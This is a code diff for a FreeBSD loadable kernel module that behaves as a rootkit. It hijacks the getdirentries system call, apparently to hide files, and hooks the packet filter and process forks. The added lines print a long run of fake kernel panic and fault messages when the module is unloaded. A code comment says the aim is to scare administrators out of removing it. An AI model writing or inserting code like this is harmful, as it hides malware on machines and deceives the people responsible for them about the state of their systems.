@@ -425,16 +425,31 @@ static void unload(void) {
     if (g_hook) {
         pfil_remove_hook(g_hook);
         g_hook = NULL;
+        // print some jargin to make them think they shouldn't unload it
+        printf("panic: vm_fault: fault on nofault entry at 0xdeadbeef\n");
+        printf("kernel: page fault at 0xfffff80001234abc, rip = 0xffffffff80abc123\n");
+        printf("Fatal trap 12: page fault while in kernel mode\n");
+        printf("cpuid = 0; apic id = 00\n");
+        printf("current process = 12 (kldunload)\n");
+        printf("trap number = 12\n");
+        printf("panic: mutex Giant not owned");
+        printf("KLD unload triggered recursive spinlock acquisition\n");
+        printf("double fault while processing kernel stack\n");
+        printf("invalid opcode fault at 0xfeedface\n");
+        printf("WARNING: attempt to free unallocated memory (addr: 0xbaadf00d)\n");
+        printf("vm_page_alloc: failed to allocate page, out of memory\n");
+        printf("kernel: unexpected soft lockup detected on CPU 1\n");
+        printf("page fault in supervisor mode, caused by LKM: 0xdeadbeef\n");
+        printf("kernel stack overflow: recursive function call in kldunload\n");
+        printf("general protection fault during kldunload: segment limit exceeded\n");
+        printf("Panic: corrupted linked list detected during LKM cleanup\n");
+        printf("WARNING: race condition detected in module unload handler\n");
+        printf("Segmentation fault: invalid access in memory region 0x0badc0de\n");
+        printf("FATAL: spinlock acquisition failure in module cleanup\n");
+        printf("WARNING: inconsistent filesystem state detected post-unload\n");
         printf("kernel panic triggered, rebooting...\n");
     }
     unload_custom_fork_event_handler();
-}
-
-static void test(void) {
-    printf(KERN_INFO "This will appear in standard system message color\n");
-    printf(KERN_WARNING "This will appear with more urgency\n");
-    printf(KERN_NOTICE "This will appear with more urgency\n");
-    printf(KERN_DEBUG "This will appear with more urgency\n");
 }
 
 // delcare LKM functionality
@@ -452,7 +467,6 @@ static int event_handler(struct module *module, int event, void *arg) {
             load_custom_fork_event_handler();
             original_getdirentries = sysent[SYS_getdirentries].sy_call;
             sysent[SYS_getdirentries].sy_call = (sy_call_t *)custom_getdirentries;
-            test();
             return 0;
         case MOD_UNLOAD:
             sysent[SYS_getdirentries].sy_call = original_getdirentries;
